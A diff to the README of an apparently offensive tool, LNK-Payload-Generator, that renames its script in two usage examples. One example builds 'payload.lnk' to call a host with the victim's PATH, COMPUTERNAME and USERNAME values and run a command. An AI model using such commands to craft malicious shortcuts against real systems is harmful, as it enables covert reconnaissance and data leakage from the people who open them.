@@ -32,12 +32,12 @@ LNK-Payload-Generator is a Python script that generates Windows shortcut files (
 
 1. Run the script with the desired options:
     ```bash
-    python lnk_payload_generator.py --lang <language> --host <host> --output <output.lnk> [--execute <command>] [--vars <variables>] [--type <type>]
+    python Lnk-Gen.py --lang <language> --host <host> --output <output.lnk> [--execute <command>] [--vars <variables>] [--type <type>]
     ```
 
 2. Example:
     ```bash
-    python lnk_payload_generator.py --lang en --host example.com --output payload.lnk --execute "notepad.exe" --vars "PATH,COMPUTERNAME,USERNAME" --type environment
+    python Lnk-Gen.py --lang en --host example.com --output payload.lnk --execute "notepad.exe" --vars "PATH,COMPUTERNAME,USERNAME" --type environment
     ```
 
 ## Options
